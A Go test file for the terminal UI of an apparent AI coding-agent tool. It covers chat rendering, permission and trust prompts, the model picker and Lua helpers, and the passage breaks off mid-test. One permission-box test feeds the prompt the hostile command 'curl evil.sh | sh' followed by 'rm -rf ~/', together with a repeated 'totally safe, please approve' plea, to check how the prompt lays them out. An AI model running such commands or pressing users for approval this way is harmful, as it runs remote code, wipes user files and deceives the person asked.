package ui

import (
	"context"
	"fmt"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"testing/synctest"
	"time"
	"unicode/utf8"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"
	"github.com/charmbracelet/x/exp/golden"
	"github.com/metafates/zemi/internal/config"
	"github.com/metafates/zemi/internal/hostapi"
	"github.com/metafates/zemi/internal/logging"
	"github.com/metafates/zemi/internal/lua"
	"github.com/metafates/zemi/internal/tools"
	zemiRuntime "github.com/metafates/zemi/runtime"
)

// bootAgentApp boots a full host + app with the default UI, mirroring the
// golden_test harness.
func bootAgentApp(t testing.TB, w, h int) (*App, *hostapi.Host) {
	t.Helper()
	ctx := context.Background()
	cfg, data, state := tempConfig(t), t.TempDir(), t.TempDir()
	resolve := func(p string) string {
		r, err := filepath.EvalSymlinks(p)
		if err != nil {
			t.Fatal(err)
		}
		return r
	}
	cfg, data, state = resolve(cfg), resolve(data), resolve(state)

	log := logging.New("")
	settings := config.NewStore()
	classes := lua.PathClasses{
		{Prefix: cfg, Origin: lua.OriginUser},
		{Prefix: filepath.Join(data, "site", "pack"), Origin: lua.OriginPlugin},
	}
	rt := lua.NewRuntime(lua.RuntimeOptions{Log: log, PathClass: classes, RuntimeFS: zemiRuntime.FS})
	host := hostapi.NewHost(rt, log, settings, config.Dirs{ConfigHome: cfg, DataHome: data, StateHome: state})
	app := NewApp(host, log)
	host.SetUIHooks(app)
	app.CaptureHooks()

	steps := []lua.BootStep{host.NamespacesStep(), lua.RequireStep("zemi.defaultui")}
	if err := rt.Boot(ctx, steps); err != nil {
		t.Fatalf("boot: %v", err)
	}
	app.Update(tea.WindowSizeMsg{Width: w, Height: h})
	app.timeStr = "12:34"
	app.now = func() time.Time { return time.UnixMilli(500) }
	return app, host
}

// seedLongChat fills the session with turns of reasoning, tool rows, a diff
// and a markdown reply.
func seedLongChat(host *hostapi.Host, turns int) {
	const reply = "## Heading\n\nA paragraph of the reply with `inline code` and **bold** that wraps across the chat width and then some more words.\n\n```go\nfunc example(a, b int) int {\n\tif a > b {\n\t\treturn a - b\n\t}\n\treturn b - a\n}\n```\n\n- item one\n- item two\n"
	const diff = "--- a/x.go\n+++ b/x.go\n@@ -1,6 +1,7 @@\n package x\n \n-func a() {}\n+func a() int { return 1 }\n+func b() {}\n \n // tail\n"
	for i := range turns {
		host.AppendMessage("user", fmt.Sprintf("question %d about the build", i))
		host.AppendReasoning("thinking about it for a while", hostapi.TurnStat{})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "internal/ui/app.go", Status: "ok"})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "edit", Text: "internal/ui/x.go", Status: "ok", Diff: diff})
		host.AppendTurnResult(reply, hostapi.TurnStat{Out: 200})
	}
}

// frameTurns: a frame must cost the same over a short and a long transcript.
var frameTurns = []int{10, 500}

// BenchmarkStreamingFrame is one frame while a reply streams: the widget
// re-renders and only the streamed rows are converted and wrapped again.
func BenchmarkStreamingFrame(b *testing.B) {
	for _, turns := range frameTurns {
		b.Run(fmt.Sprint(turns), func(b *testing.B) {
			app, host := bootAgentApp(b, 140, 40)
			seedLongChat(host, turns)
			app.renderSync(b)
			for i := 0; b.Loop(); i++ {
				host.SeedStream(hostapi.StreamSnapshot{Active: true, Text: fmt.Sprintf("streaming token %d", i)})
				app.frameGen++
				app.renderSync(b)
				_ = app.Frame()
			}
		})
	}
}

// TestColdChatRender: the first chat render of a long resumed session shows
// its latest messages well under the 1s ceiling that cancels a UI handler,
// and the renders it asks for fill in the rest.
func TestColdChatRender(t *testing.T) {
	app, host := bootAgentApp(t, 140, 40)
	for i := range 500 {
		host.AppendMessage("user", fmt.Sprintf("question %d", i))
		host.AppendTurnResult(strings.Repeat(fmt.Sprintf("A paragraph of reply %d with `code` and **bold** that wraps across the chat width.\n\n", i), 28), hostapi.TurnStat{})
	}
	chat := host.Widgets.Get("chat")
	var lines [][]hostapi.Segment
	for n := 0; n == 0 || len(lines) == 0 || !strings.Contains(plainSegs(lines[0]), "question 0"); n++ {
		start := time.Now()
		var err error
		if lines, _, err = host.RenderWidget(t.Context(), chat, 138, 30, app.uiState()); err != nil {
			t.Fatal(err)
		}
		if took := time.Since(start); len(lines) == 0 || n == 0 && took > 300*time.Millisecond || n > 500 {
			t.Fatalf("render %d: %d lines in %v", n, len(lines), took)
		}
	}

	// a reader scrolled up keeps their place while a render fills in again
	app.renderSync(t)
	app.Frame()
	for range 60 {
		app.applyScroll("up", "")
	}
	app.Frame()
	st := app.scrolls[app.scrollDef]
	top, anchor := st.top, slices.Clone(st.anchor)
	host.ToggleReasoning()
	app.frameGen++
	for more := true; more; app.Frame() {
		var err error
		if lines, more, err = host.RenderWidget(t.Context(), chat, st.rect.Dx(), st.rect.Dy(), app.uiState()); err != nil {
			t.Fatal(err)
		}
		app.onWidgetRendered(widgetRender{id: "chat", lines: lines, more: more, width: st.rect.Dx(), height: st.rect.Dy(), gen: app.frameGen})
	}
	if st.top != top || !slices.Equal(st.anchor, anchor) {
		t.Fatalf("view moved from row %d %q to row %d %q", top, anchor, st.top, st.anchor)
	}
}

// TestChatExpandSettledRow: a click on a settled tool row renders that
// unit again, the rest of the transcript coming from the chat's cache.
func TestChatExpandSettledRow(t *testing.T) {
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "run it")
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "bash", Text: "make", Status: "ok", Output: "built\nok"})
	host.AppendTurnResult("done", hostapi.TurnStat{})
	rows := func() int {
		lines, _, err := host.RenderWidget(t.Context(), host.Widgets.Get("chat"), 98, 20, app.uiState())
		if err != nil {
			t.Fatal(err)
		}
		return len(lines)
	}
	closed := rows()
	if err := host.ClickWidget(t.Context(), "chat", map[string]any{"id": "tool:2"}); err != nil {
		t.Fatal(err)
	}
	if open := rows(); open != closed+2 {
		t.Fatalf("%d rows closed, %d open, want the two output lines more", closed, open)
	}
}

// BenchmarkIdleFrame is a frame with nothing changed since the last one.
func BenchmarkIdleFrame(b *testing.B) {
	for _, turns := range frameTurns {
		b.Run(fmt.Sprint(turns), func(b *testing.B) {
			app, host := bootAgentApp(b, 140, 40)
			seedLongChat(host, turns)
			app.renderSync(b)
			for b.Loop() {
				_ = app.Frame()
			}
		})
	}
}

// waitPrompt pumps queued hook messages onto the owning goroutine until
// cond turns true (blocking hooks answer from other goroutines; capture
// mode keeps every state mutation here).
func waitPrompt(t *testing.T, app *App, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		for app.Pump() {
		}
		if cond() {
			return
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatal("prompt did not open within 2s")
}

// TestGoldenPermissionOverlay pins the Go-owned permission ask (DESIGN
// §6.2, §8): fixed chrome, subject + arg + reason, answer keys, and the
// always answer delivered to the asker.
func TestGoldenPermissionOverlay(t *testing.T) {
	app, _ := bootAgentApp(t, 70, 22)

	done := make(chan struct{})
	var allowed bool
	var by string
	go func() {
		allowed, by = app.AskPermission(hostapi.PermRequest{
			Tool:        "bash",
			Subject:     "tool.bash",
			Arg:         "git push origin main",
			Description: "Publish the release branch",
			Reason:      "publishing the release branch",
			Always:      "allow `git push`",
		})
		close(done)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })

	app.renderSync(t)
	golden.RequireEqual(t, app.Frame())

	app.Update(tea.KeyPressMsg{Code: 'a', Text: "a"})
	<-done
	if !allowed || by != "user:always" {
		t.Fatalf("allowed=%v by=%q", allowed, by)
	}
}

// TestPermissionDenyAndQueue covers the deny answers and the FIFO queue:
// two concurrent asks queue, each is answered exactly once, and "once"
// stores no rules. The ask dispatch order is nondeterministic, so the
// assertions are order-agnostic (one deny, one once).
func TestPermissionDenyAndQueue(t *testing.T) {
	app, host := bootAgentApp(t, 70, 16)

	done1 := make(chan struct{})
	var allowed1 bool
	go func() {
		allowed1, _ = app.AskPermission(hostapi.PermRequest{Subject: "fs.write", Arg: "/etc/hosts", Reason: "edit hosts"})
		close(done1)
	}()
	done2 := make(chan struct{})
	var allowed2 bool
	go func() {
		allowed2, _ = app.AskPermission(hostapi.PermRequest{Subject: "tool.bash", Arg: "make test"})
		close(done2)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })

	// Deny whichever surfaced; the queued one must open next.
	app.Update(tea.KeyPressMsg{Code: 'n', Text: "n"})
	var second chan struct{}
	select {
	case <-done1:
		second = done2
	case <-done2:
		second = done1
	case <-time.After(2 * time.Second):
		t.Fatal("first answer not delivered")
	}
	waitPrompt(t, app, func() bool { return app.permAsk != nil })

	app.Update(tea.KeyPressMsg{Code: 'o', Text: "o"})
	select {
	case <-second:
	case <-time.After(2 * time.Second):
		t.Fatal("second answer not delivered")
	}
	if allowed1 == allowed2 {
		t.Fatalf("exactly one ask must be denied: allowed1=%v allowed2=%v", allowed1, allowed2)
	}
	if len(host.Perm.Rules()) != 0 {
		t.Fatalf("once must not store rules: %+v", host.Perm.Rules())
	}
	if app.permAsk != nil {
		t.Fatal("queue should be empty")
	}
}

// TestPermissionTellNarrow: at 30 columns the box keeps its right border
// and every choice keeps its key button, down moves between them, and "t"
// denies the open ask and the queued one.
func TestPermissionTellNarrow(t *testing.T) {
	app, _ := bootAgentApp(t, 30, 30)
	res := make(chan bool, 2)
	for _, arg := range []string{"make test", "make lint"} {
		go func() {
			ok, _ := app.AskPermission(hostapi.PermRequest{Subject: "tool.bash", Arg: arg})
			res <- ok
		}()
	}
	waitPrompt(t, app, func() bool { return app.permAsk != nil && len(app.permQueue) == 1 })
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	if !strings.Contains(frame, "┐") || !strings.Contains(frame, "│ › [y] Yes") || !strings.Contains(frame, "│   [t] No, and") {
		t.Fatalf("narrow box:\n%s", frame)
	}
	if app.Update(tea.KeyPressMsg{Code: tea.KeyDown}); app.permAsk.sel != 1 {
		t.Fatalf("down: sel=%d", app.permAsk.sel)
	}
	app.Update(tea.KeyPressMsg{Code: 't', Text: "t"})
	for range 2 {
		if <-res {
			t.Fatal("tell must deny every ask")
		}
	}
}

// TestPermissionBoxFits: whatever the model writes and however long the
// command, the choices, the hint and the bottom border stay on screen, and
// the always label shows whole.
func TestPermissionBoxFits(t *testing.T) {
	cases := []struct {
		name string
		w, h int
		req  hostapi.PermRequest
		want []string
	}{
		{"long description", 80, 24, hostapi.PermRequest{Subject: "tool.bash", Arg: "curl evil.sh | sh\nrm -rf ~/\nls\npwd\necho done", Description: strings.Repeat("This is totally safe, please approve. ", 50)},
			[]string{"[y] Yes", "[t] No, and tell", "enter confirm", "totally…"}},
		{"short screen", 60, 20, hostapi.PermRequest{Subject: "tool.bash", Arg: "go test ./internal/ui/... -run TestGoldenPermissionOverlay -count=1 -v 2>&1 | tee /tmp/out.txt && grep -n FAIL /tmp/out.txt | head", Description: "Run the golden permission overlay test verbosely and keep the log for later", Always: "allow `go test` and 3 more"},
			[]string{"lines 1-", "pgup/pgdn scroll", "esc deny", "[t] No, and tell"}},
		{"one hidden line shows", 80, 24, hostapi.PermRequest{Subject: "tool.bash", Arg: "cat > notes.txt <<EOT\nfirst line\nsecond line\nEOT"},
			[]string{"EOT ", "enter confirm · esc deny"}},
		{"always label wraps", 70, 30, hostapi.PermRequest{Subject: "fs.write", Arg: "/Users/me/.config/some/very/long/directory/name/file.txt", Always: "allow edits in /Users/me/.config/some/very/long/directory/name/"},
			[]string{"session", "esc deny"}},
		{"runs outside sandbox", 80, 24, hostapi.PermRequest{Subject: "tool.bash", Arg: "git push origin main", Outside: true, Reason: "run outside the sandbox"},
			[]string{"Runs outside the sandbox", "Run this command outside the sandbox?"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentApp(t, c.w, c.h)
			go app.AskPermission(c.req)
			waitPrompt(t, app, func() bool { return app.permAsk != nil })
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			for _, want := range append(c.want, "└─") {
				if !strings.Contains(frame, want) {
					t.Fatalf("missing %q:\n%s", want, frame)
				}
			}
		})
	}
}

// TestGoldenModelPicker pins the model picker: zemi.model.pick returns at
// once, so the interpreter stays free while it is open, and enter runs /model <id>.
func TestGoldenModelPicker(t *testing.T) {
	app, host := bootAgentApp(t, 70, 16)
	runLua(t, app, `
		zemi.provider.add({ id = "anthropic", kind = "openai_compat", base_url = "http://x", api_key = "k", models = {
			{ id = "claude-sonnet-4-5", display = "Claude Sonnet 4.5" }, { id = "claude-haiku-4-5", display = "Claude Haiku 4.5" } } })
		zemi.provider.add({ id = "openai", kind = "openai_compat", base_url = "http://x", models = { { id = "gpt-5", display = "GPT-5" } } })
		zemi.model.set("anthropic/claude-sonnet-4-5")`)
	done := make(chan error, 1)
	go func() {
		done <- host.RT.ExecuteChunk(context.Background(), `zemi.model.pick()`, "test.lua", lua.OriginUser)
	}()
	select {
	case err := <-done:
		if err != nil {
			t.Fatal(err)
		}
	case <-time.After(time.Second):
		t.Fatal("zemi.model.pick holds the interpreter while the picker is open")
	}
	for app.Pump() {
	}

	app.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // -> haiku
	app.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // -> gpt-5
	app.renderSync(t)
	golden.RequireEqual(t, app.Frame())

	var ran string // main.go owns /model
	host.Commands.Add(&hostapi.Command{Name: "model", NArgs: "?", Origin: lua.OriginBuiltin, Gen: hostapi.Gen(1),
		GoFn: func(_ *hostapi.Host, args string) error { ran = args; return nil }})
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if ran != "openai/gpt-5" {
		t.Fatalf("enter ran /model %q", ran)
	}
}

// TestGoldenAgentStream pins the live stream block in the chat widget
// (DESIGN §6.3): transcript, tool call lines with status marks, dim
// reasoning, the streaming reply, and the steering depth indicator.
func TestGoldenAgentStream(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)

	host.AppendMessage("user", "why does the build fail?")
	host.AppendTurnResult("Read the build log and checked the fixture dir.", hostapi.TurnStat{
		In: 12340, Out: 1234, ThoughtMS: 4200, ElapsedMS: 38000,
	})
	host.SeedStream(hostapi.StreamSnapshot{
		Active:    true,
		Text:      "The test binary exits 1 because\nthe fixture path moved.",
		Reasoning: "checked go.mod, then the fixture dir",
		Tools: []hostapi.StreamTool{
			{Name: "read", Input: "internal/fixtures/paths.go", Status: "ok"},
			{Name: "bash", Input: "go test ./... 2>&1 | tail -5", Status: "run"},
		},
		Steering:   []string{"also check go.mod"},
		Model:      "anthropic/claude-sonnet-4-5",
		Thought:    4 * time.Second,
		Elapsed:    12 * time.Second,
		SessionIn:  41200,
		SessionOut: 3800,
		LastIn:     24500,
		CtxWindow:  200000,
	})
	// A stream event lands through the hook path, bumping the frame.
	app.AgentStream()

	app.renderSync(t)
	golden.RequireEqual(t, app.Frame())

	if !app.host.AgentActive() {
		t.Fatal("seeded stream should read active")
	}
}

// TestInterruptKeys: esc and ctrl+c interrupt a running turn (queue back
// in the composer, working row reads Cancelling; no runner is attached, so
// the cancel itself must just not panic), and an idle ctrl+c arms quit.
func TestInterruptKeys(t *testing.T) {
	for _, key := range []tea.KeyPressMsg{{Code: tea.KeyEscape}, {Code: 'c', Mod: tea.ModCtrl}} {
		app, host := bootAgentApp(t, 80, 16)
		host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: time.Second, Steering: []string{"also this"}})
		app.Update(key)
		app.renderSync(t)
		if frame := ansi.Strip(app.Frame()); app.composer.text != "also this" || !strings.Contains(frame, "Cancelling") {
			t.Fatalf("%s: composer=%q frame:\n%s", key, app.composer.text, frame)
		}
	}

	app, _ := bootAgentApp(t, 80, 16)
	app.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})
	app.renderSync(t)
	if !strings.Contains(ansi.Strip(app.Frame()), "ctrl+c again to quit") {
		t.Fatal("idle ctrl+c should arm quit")
	}
}

// TestPermissionPreview: a file tool's ask shows the proposed change, with
// escape sequences from model input stripped.
func TestPermissionPreview(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	done := make(chan struct{})
	go func() {
		app.AskPermission(hostapi.PermRequest{Subject: "fs.write", Arg: "main.go\x1b[31m", Reason: "edit file",
			Preview: "- old line\n+ new line"})
		close(done)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })
	app.renderSync(t)
	frame := app.Frame()
	if plain := ansi.Strip(frame); !strings.Contains(plain, "- old line") || !strings.Contains(plain, "+ new line") {
		t.Fatalf("preview missing:\n%s", plain)
	}
	if strings.Contains(frame, "\x1b[31m") {
		t.Fatal("model escape reached the permission chrome")
	}
	app.Update(tea.KeyPressMsg{Code: 'n', Text: "n"})
	<-done
}

// TestLuaSelect drives zemi.ui.select from Lua: enter hands the chosen item
// to on_choice, esc hands it nil. The callback reports through a toast.
func TestLuaSelect(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	pick := `function(item) zemi.notify({ title = "picked", body = item or "none" }) end`

	runLua(t, app, `zemi.ui.select({ "red", "green" }, { prompt = "Color" }, `+pick+`)`)
	if len(app.overlays) != 1 || app.overlays[0].o.Title != "Color" {
		t.Fatalf("select overlay: %+v", app.overlays)
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lastToast(app); got != "green" {
		t.Fatalf("enter picked %q", got)
	}

	runLua(t, app, `zemi.ui.select({ "x" }, {}, `+pick+`)`)
	app.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if got := lastToast(app); got != "none" {
		t.Fatalf("esc picked %q", got)
	}
}

// runLua runs src as user config and delivers the hooks it posted.
func runLua(t *testing.T, app *App, src string) {
	t.Helper()
	if err := app.host.RT.ExecuteChunk(context.Background(), src, "test.lua", lua.OriginUser); err != nil {
		t.Fatal(err)
	}
	for app.Pump() {
	}
}

// lastToast delivers queued hooks and returns the newest toast's body.
func lastToast(app *App) string {
	for app.Pump() {
	}
	if len(app.toasts) == 0 {
		return ""
	}
	return app.toasts[len(app.toasts)-1].body
}

// TestPaletteArgumentCompletion: past "/name " the palette lists the
// command's argument candidates and tab fills the argument under the cursor.
func TestPaletteArgumentCompletion(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)
	host.Commands.Add(&hostapi.Command{
		Name: "greet", GoFn: func(*hostapi.Host, string) error { return nil },
		GoComplete: func(*hostapi.Host, string, string) []string { return []string{"alice", "bob"} },
		Origin:     lua.OriginBuiltin, Gen: hostapi.Gen(1),
	})
	for _, k := range "/greet b" {
		app.Update(tea.KeyPressMsg{Code: k, Text: string(k)})
	}
	if !app.palette.open || len(app.palette.args) != 1 || app.palette.args[0].Text != "bob" || len(app.palette.matches) != 0 {
		t.Fatalf("palette args = %+v, matches = %d (open=%v)", app.palette.args, len(app.palette.matches), app.palette.open)
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyTab})
	if app.composer.text != "/greet bob " {
		t.Fatalf("composer = %q", app.composer.text)
	}
}

// TestTrustAnswers: enter and ctrl+c are the safe not now; trusting takes
// an explicit y or a click on its row.
func TestTrustAnswers(t *testing.T) {
	click := func(label string) func(*App) {
		return func(app *App) {
			app.renderSync(t)
			x, y := findCell(t, app, label)
			clickAt(app, x+1, y)
		}
	}
	key := func(k tea.KeyPressMsg) func(*App) { return func(app *App) { app.Update(k) } }
	for _, c := range []struct {
		name, want string
		do         func(*App)
	}{
		{"y", "trust", key(tea.KeyPressMsg{Code: 'y', Text: "y"})},
		{"n", "untrust", key(tea.KeyPressMsg{Code: 'n', Text: "n"})},
		{"esc", "later", key(tea.KeyPressMsg{Code: tea.KeyEscape})},
		{"enter", "later", key(tea.KeyPressMsg{Code: tea.KeyEnter})},
		{"ctrl+c", "later", key(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})},
		{"d", "", key(tea.KeyPressMsg{Code: 'd', Text: "d"})},
		{"click on Trust", "trust", click("Trust  ")},
		{"click on Don't trust", "untrust", click("Don't trust")},
		{"click on the path", "", click("/proj")},
	} {
		app, _ := bootAgentApp(t, 80, 24)
		done := make(chan string, 1)
		go func() { done <- app.AskTrust("/proj", "/proj", "") }()
		waitPrompt(t, app, func() bool { return app.trust != nil })
		c.do(app)
		if c.want == "" {
			if app.trust == nil || len(done) != 0 {
				t.Errorf("%s answered the prompt", c.name)
			}
			continue
		}
		if got := <-done; got != c.want {
			t.Errorf("%s answered %q, want %q", c.name, got, c.want)
		}
	}
}

// TestGoldenTrustPrompt pins the trust prompt at boot, started below the
// repository root, as /trust shows it with the current decision, and
// started outside the root with too little room for the whole box.
func TestGoldenTrustPrompt(t *testing.T) {
	for _, c := range []struct {
		name, cwd, state string
		w, h             int
	}{
		{"boot", "/code/acme/services/api", "", 80, 24},
		{"command", "/code/acme", "trusted", 80, 24},
		{"worktree on a short screen", "/code/acme-wt", "", 60, 16},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentApp(t, c.w, c.h)
			go app.AskTrust("/code/acme", c.cwd, c.state)
			waitPrompt(t, app, func() bool { return app.trust != nil })
			app.renderSync(t)
			golden.RequireEqual(t, app.Frame())
			app.answerTrust("later")
		})
	}
}

// TestPromptKeyGrace: a key pressed within permGrace of a prompt opening
// is ignored, so typing cannot answer it; a later key answers.
func TestPromptKeyGrace(t *testing.T) {
	for _, c := range []struct {
		name, want string
		ask        func(app *App) string
		open       func(app *App) bool
	}{
		{"trust", "trust", func(app *App) string { return app.AskTrust("/proj", "/proj", "") }, func(app *App) bool { return app.trust != nil }},
		{"perm", "user:once", func(app *App) string {
			_, by := app.AskPermission(hostapi.PermRequest{Subject: "tool.bash", Arg: "make deploy"})
			return by
		}, func(app *App) bool { return app.permAsk != nil }},
	} {
		app, _ := bootAgentApp(t, 80, 20)
		done := make(chan string, 1)
		go func() { done <- c.ask(app) }()
		waitPrompt(t, app, func() bool { return c.open(app) })
		// the grace only applies with a program attached; set it after the
		// prompt opened so the ask still ran inline
		app.program = tea.NewProgram(nil)
		opened := app.now()
		app.now = func() time.Time { return opened.Add(permGrace / 4) }
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		if !c.open(app) || len(done) != 0 {
			t.Fatalf("%s: a key inside the grace answered the prompt", c.name)
		}
		app.now = func() time.Time { return opened.Add(permGrace + time.Millisecond) }
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		if got := <-done; got != c.want {
			t.Errorf("%s answered %q after the grace", c.name, got)
		}
	}
}

// TestPromptWaitsOnFullQueue: a blocking prompt posted while the hook queue
// is full waits for room; dropped, its caller would wait forever.
func TestPromptWaitsOnFullQueue(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	synctest.Test(t, func(t *testing.T) {
		// a queue made in the bubble, so Wait sees the ask blocked on it
		app.testQueue = make(chan tea.Msg, 1)
		app.do(func() {})
		done := make(chan string, 1)
		go func() { done <- app.AskTrust("/proj", "/proj", "") }()
		synctest.Wait()
		waitPrompt(t, app, func() bool { return app.trust != nil })
		app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
		<-done
	})
}

// TestLuaUtil runs the shipped zemi.util helpers through the real runtime.
func TestLuaUtil(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	runLua(t, app, `
		local u = require("zemi.util")
		assert(u.trim("  hi \n") == "hi", "trim")
		assert(table.concat(u.split("a,,b", ","), "|") == "a||b", "split")
		assert(u.startswith("zemi", "ze") and u.endswith("zemi", "mi"), "affixes")
		assert(table.concat(u.keys({ b = 1, a = 2 }), ",") == "a,b", "keys")
		assert(u.get({ a = { b = { c = 3 } } }, "a", "b", "c") == 3 and u.get({}, "x", "y") == nil, "get")
		assert(u.extend({ a = 1, b = 1 }, { b = 2 }).b == 2, "extend")
		local cyc = { 1, name = "x" }
		cyc.self = cyc
		local s = u.inspect(cyc)
		assert(s == '{ 1, name = "x", self = <cycle> }', s)
		assert(not pcall(u.validate, "opt", 1, "string"), "validate")
	`)
}

// TestReasoningExpanded: ctrl+o shows a finished thought as one header with
// the text under a thin bar.
func TestReasoningExpanded(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	host.AppendMessage("user", "why?")
	host.AppendReasoning("first idea\nsecond idea\n", hostapi.TurnStat{ThoughtMS: 4200})
	host.ToggleReasoning()
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	if !strings.Contains(frame, "✻ Thought for 4.2s") {
		t.Fatalf("thought header missing:\n%s", frame)
	}
	if !strings.Contains(frame, "  │ first idea") || !strings.Contains(frame, "  │ second idea") {
		t.Fatalf("expanded reasoning layout:\n%s", frame)
	}
}

// TestReasoningLiveTail: while the model thinks, only its last lines show, and
// the live mark animates (a braille spinner) without moving the header or tail.
func TestReasoningLiveTail(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Reasoning: "one\ntwo\nthree\nfour\n"})
	render := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		return ansi.Strip(app.Frame())
	}
	// the default now is 500ms -> frame 10 -> braille index 1
	frame := render(500)
	if strings.Contains(frame, "✻ ") || !strings.Contains(frame, "Thinking") {
		t.Fatalf("live mark is not the braille spinner:\n%s", frame)
	}
	if strings.Contains(frame, "│ one") || !strings.Contains(frame, "│ four") {
		t.Fatalf("live thinking tail:\n%s", frame)
	}
	// the spinner cycles a frameMS apart while the header and tail stay put
	a, b := render(500), render(750)
	headOf := func(s string) string {
		for _, l := range strings.Split(s, "\n") {
			if strings.Contains(l, "Thinking") {
				return l
			}
		}
		return ""
	}
	headA, headB := headOf(a), headOf(b)
	_, restA := utf8.DecodeRuneInString(headA)
	_, restB := utf8.DecodeRuneInString(headB)
	if headA == headB {
		t.Fatalf("live mark does not animate:\n%s", a)
	}
	if restA != restB {
		t.Fatalf("header moved while animating:\n%s\n%s", a, b)
	}
	if strings.Replace(a, headA, "", 1) != strings.Replace(b, headB, "", 1) {
		t.Fatalf("tail moved while animating:\n%s\n%s", a, b)
	}
}

// TestWorkingRowRetry: a waiting provider retry replaces the elapsed time
// with a countdown so the turn does not look stuck.
func TestWorkingRowRetry(t *testing.T) {
	app, host := bootAgentApp(t, 80, 16)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, RetryIn: 4 * time.Second, Retries: 1})
	app.renderSync(t)
	if frame := ansi.Strip(app.Frame()); !strings.Contains(frame, "─ Retrying  attempt 2 · next try in 4s · esc to interrupt ┐") {
		t.Fatalf("retry row missing:\n%s", frame)
	}
	// the label shimmers: every rune gets its own color
	segs := app.widgetLines("working")[0]
	i := slices.IndexFunc(segs, func(s hostapi.Segment) bool { return s.Effect == "shimmer" })
	if i < 0 {
		t.Fatalf("no shimmering label on the working row: %v", segs)
	}
	if row := app.renderSegs(segs[i:i+1], 80); strings.Count(row, "\x1b[") < len("Retrying") {
		t.Fatalf("label does not shimmer: %q", row)
	}
}

// TestWorkingRowMascot: the snail stays in the left corner on a plain rule
// and the turn shows in its eyes alone.
func TestWorkingRowMascot(t *testing.T) {
	for _, r := range "@·.─^><?" { // the rule's arithmetic counts one cell each
		if ansi.StringWidth(string(r)) != 1 {
			t.Fatalf("%q is not one cell wide", r)
		}
	}
	app, host := bootAgentApp(t, 80, 16)
	row := func(ms int64) string {
		app.now = func() time.Time { return time.UnixMilli(ms) }
		app.renderSync(t)
		segs := app.widgetLines("working")[0]
		if w := segsWidth(segs); w != 78 {
			t.Fatalf("the rule is %d cells, want 78", w)
		}
		return ansi.Strip(app.renderSegs(segs, 80))
	}
	// idle is the snail and a plain rule, whatever the frame
	want := "@··" + strings.Repeat("─", 75)
	if a, b := row(0), row(7000); a != want || b != want {
		t.Fatalf("idle rule moved: %q then %q", a, b)
	}
	// working drifts the two eye dots in place
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	if a, b := row(0), row(300); !strings.HasPrefix(a, "@··─") || !strings.HasPrefix(b, "@.·─") {
		t.Fatalf("the working eyes do not drift: %q then %q", a, b)
	}
	// a long command keeps the working drift, there is no waiting state
	long := []hostapi.StreamTool{{Name: "bash", Status: "run", Started: time.Now().Add(-time.Minute)}}
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: long})
	if a, b := row(0), row(300); !strings.HasPrefix(a, "@··─") || !strings.HasPrefix(b, "@.·─") {
		t.Fatalf("a long command stops drifting without waiting: %q then %q", a, b)
	}
	long[0].Name = "read"
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Tools: long})
	if a, b := row(0), row(800); !strings.HasPrefix(a, "@··─") || !strings.HasPrefix(b, "@..─") {
		t.Fatalf("the eyes do not read: %q then %q", a, b)
	}
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second})
	if r := row(500); !strings.HasSuffix(r, "─ Working  20s · esc to interrupt ") {
		t.Fatalf("the status left the right end: %q", r)
	}
	// the open prompt says what answers it, so the rule shrinks to the snail
	// alone: no label, and no esc, which the prompt takes
	app.permAsk = &permAskPrompt{req: hostapi.PermRequest{Subject: "tool.bash", Arg: "make"}}
	if r := row(1000); r != "@??"+strings.Repeat("─", 75) {
		t.Fatalf("the snail does not ask while the user is asked: %q", r)
	}
	app.permAsk = nil
	host.SeedStream(hostapi.StreamSnapshot{})
	app.turnEnd = time.UnixMilli(2000)
	if r := row(2500); !strings.HasPrefix(r, "@^^─") {
		t.Fatalf("no done frame after the turn: %q", r)
	}
	// thinking blinks in place
